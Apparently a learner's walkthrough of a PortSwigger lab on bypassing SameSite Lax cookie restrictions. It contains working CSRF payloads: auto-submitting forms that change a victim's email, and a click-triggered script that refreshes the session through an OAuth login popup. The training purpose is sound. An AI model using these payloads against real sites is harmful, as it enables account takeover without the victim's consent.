# Lab: SameSite Lax bypass via cookie refresh
# https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-lax-restrictions-with-newly-issued-cookies/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh#

```bash
# Change your email and check change-email request.

# notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions. 

# Check oauth-callback

Response:
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=Smr0LuSQoenpe8m2jwG7LZfbKpTJWEdK; Expires=Wed, 10 Jul 2024 13:30:33 UTC; Secure; HttpOnly

# Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level.

```

```bash
# Go to the exploit server,Store and view the exploit yourself.

<script>
    history.pushState('', '', '/')
</script>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>

# if it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately.

# If you logged in less than two minutes ago, the attack is successful and your email address is changed. From the Proxy > HTTP history tab, find the POST /my-account/change-email request and confirm that your session cookie was included even though this is a cross-site POST request.

```
```bash

<form method="POST" action="https://0ae9000504cce05e800c217e00290052.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="abcdef@gmail.com">
</form>
<script>
    window.open('https://0ae9000504cce05e800c217e00290052.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>

# In the browser, notice that if you visit /social-login, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction.

# From the proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.

# Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit /social-login, then submits the email change request after a short pause.
```


```bash
# Send this to victim

<form method="POST" action="https://0ae9000504cce05e800c217e00290052.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="abc@gmail.com">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://0ae9000504cce05e800c217e00290052.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>

# popup is being blocked because you haven't manually interacted with the page.

# Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked.
```
